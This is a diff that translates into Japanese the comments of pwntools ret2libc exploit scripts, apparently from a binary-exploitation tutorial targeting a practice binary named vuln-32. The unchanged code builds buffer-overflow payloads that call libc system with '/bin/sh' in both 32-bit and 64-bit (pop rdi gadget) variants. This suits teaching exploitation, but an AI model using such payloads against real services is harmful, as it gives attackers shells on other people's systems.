@@ -73,10 +73,10 @@ libc_base = 0xf7dc2000
 system = libc_base + 0x44f00
 binsh = libc_base + 0x18c32b
 
-payload = b'A' * 76         # The padding
-payload += p32(system)      # Location of system
-payload += p32(0x0)         # return pointer - not important once we get the shell
-payload += p32(binsh)       # pointer to command: /bin/sh
+payload = b'A' * 76         # パディング
+payload += p32(system)      # system の位置
+payload += p32(0x0)         # 戻りポインタ - シェルを取れば重要ではない
+payload += p32(binsh)       # コマンドへのポインタ: /bin/sh
 
 p.clean()
 p.sendline(payload)
@@ -107,11 +107,11 @@ binsh = libc_base + 0x18a143
 
 POP_RDI = 0x4011cb
 
-payload = b'A' * 72         # The padding
-payload += p64(POP_RDI)     # gadget -> pop rdi; ret
-payload += p64(binsh)       # pointer to command: /bin/sh
-payload += p64(system)      # Location of system
-payload += p64(0x0)         # return pointer - not important once we get the shell
+payload = b'A' * 72         # パディング
+payload += p64(POP_RDI)     # ガジェット -> pop rdi; ret
+payload += p64(binsh)       # コマンドへのポインタ: /bin/sh
+payload += p64(system)      # system の位置
+payload += p64(0x0)         # 戻りポインタ - シェルを取れば重要ではない
 
 p.clean()
 p.sendline(payload)
@@ -129,16 +129,16 @@ from pwn import *
 elf = context.binary = ELF('./vuln-32')
 p = process()
 
-libc = elf.libc                        # Simply grab the libc it's running with
-libc.address = 0xf7dc2000              # Set base address
+libc = elf.libc                        # 実行中の libc をそのまま取得
+libc.address = 0xf7dc2000              # ベースアドレスを設定
 
-system = libc.sym['system']            # Grab location of system
-binsh = next(libc.search(b'/bin/sh'))  # grab string location
+system = libc.sym['system']            # system の位置を取得
+binsh = next(libc.search(b'/bin/sh'))  # 文字列の位置を取得
 
-payload = b'A' * 76         # The padding
-payload += p32(system)      # Location of system
-payload += p32(0x0)         # return pointer - not important once we get the shell
-payload += p32(binsh)       # pointer to command: /bin/sh
+payload = b'A' * 76         # パディング
+payload += p32(system)      # system の位置
+payload += p32(0x0)         # 戻りポインタ - シェルを取れば重要ではない
+payload += p32(binsh)       # コマンドへのポインタ: /bin/sh
 
 p.clean()
 p.sendline(payload)
